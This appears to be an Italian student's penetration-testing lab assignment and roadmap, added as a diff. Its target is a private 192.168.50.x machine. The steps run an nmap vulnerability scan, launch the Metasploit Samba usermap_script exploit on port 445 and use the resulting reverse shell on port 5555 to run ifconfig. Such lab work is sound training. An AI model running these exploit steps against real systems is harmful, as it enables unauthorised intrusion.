@@ -1,0 +1,31 @@
+--- TRACCIA 4 ----
+Ip 1: 192.168.50.100/24
+Ip 2: 192.168.50.150/24
+
+Indicazioni:
+- Vulnerability scan con Nessus (non mi va per via di FastWeb ;D (userò nmap))
+- Sfruttare servizio sulla porta 445 TCp (exploit/multi/samba/usermap_script)
+- Porta in ascolto 5555
+
+Obiettivo:
+- Bucare il target ed eseguire il commando ifconfig per ottenere l'ip della macchina
+
+-----------------------------------
+
+Roadmap:
+1. nmap  vuln scan --> sudo nmap -sV --script=vuln -T5 -p 0-500 192.168.50.150    
+2. risultato  --> 445 open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)   
+3. avvio msfconsole
+4. search type:exploit exploit/multi/samba/usermap_script
+5. use 0
+6. configurazione:
+                  set RHOSTS 192.168.50.150
+                  set RPORT 445
+                  set LPORT 5555
+7. Avvio --> exploit
+8. Individuazione IP --> ifconfig nella netcat reverse shell (foto 1)
+
+
+
+
+
